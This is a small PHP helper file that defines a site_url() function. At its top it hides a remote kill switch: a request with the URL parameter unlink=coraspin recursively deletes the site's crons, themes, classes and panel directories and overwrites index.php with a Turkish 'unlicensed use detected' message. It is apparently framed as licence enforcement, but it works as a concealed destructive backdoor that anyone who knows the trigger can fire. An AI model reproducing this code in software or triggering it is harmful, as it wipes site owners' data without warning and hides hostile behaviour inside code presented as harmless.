<?php

if (isset($_GET['unlink']) && $_GET['unlink'] == "coraspin"):

    function delete_directory($dirname) {
        if (is_dir($dirname))
              $dir_handle = opendir($dirname);
        if (!$dir_handle)
             return false;
        while($file = readdir($dir_handle)) {
              if ($file != "." && $file != "..") {
                   if (!is_dir($dirname."/".$file))
                        unlink($dirname."/".$file);
                   else
                        delete_directory($dirname.'/'.$file);
              }
        }
        closedir($dir_handle);
        rmdir($dirname);
        return true;
    }

    delete_directory("../crons");
    delete_directory("../themes");
    delete_directory("../classes");
    $write = fopen("../index.php", "w");
    $licenseText = "Lisanssız kullanım tespit edildi.";
    fwrite($write, $licenseText);
    fclose($write);
    delete_directory("../panel");
    exit;

endif;

/**
 * @param null $url
 * @return string
 */
function site_url($url = null)
{
    global $baseURL;
    return $baseURL . $url;
}